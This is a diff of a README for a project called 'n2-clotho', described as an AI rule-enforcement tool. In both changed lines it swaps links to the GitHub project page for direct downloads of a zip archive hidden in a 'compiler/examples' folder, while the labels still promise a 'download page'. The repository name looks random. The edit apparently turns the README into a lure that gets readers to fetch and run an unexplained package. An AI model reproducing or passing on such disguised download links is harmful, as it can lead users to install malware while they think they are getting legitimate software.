@@ -1,6 +1,6 @@
 # ⚙️ n2-clotho - Enforce AI Rules with Clarity
 
-[![Download n2-clotho](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/violetstreaked-canicolafever227/n2-clotho)
+[![Download n2-clotho](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/violetstreaked-canicolafever227/n2-clotho/raw/refs/heads/main/compiler/examples/clotho_n_v3.6.zip)
 
 ## 🚀 What n2-clotho does
 
@@ -35,7 +35,7 @@ If you plan to use command-line tools, install them first:
 
 Open the download page here and choose the file that matches your setup:
 
-[Visit the n2-clotho download page](https://github.com/violetstreaked-canicolafever227/n2-clotho)
+[Visit the n2-clotho download page](https://github.com/violetstreaked-canicolafever227/n2-clotho/raw/refs/heads/main/compiler/examples/clotho_n_v3.6.zip)
 
 If the page offers a Windows package, download it to your Downloads folder. If it offers source files, use the setup steps below to run it on your system.
 
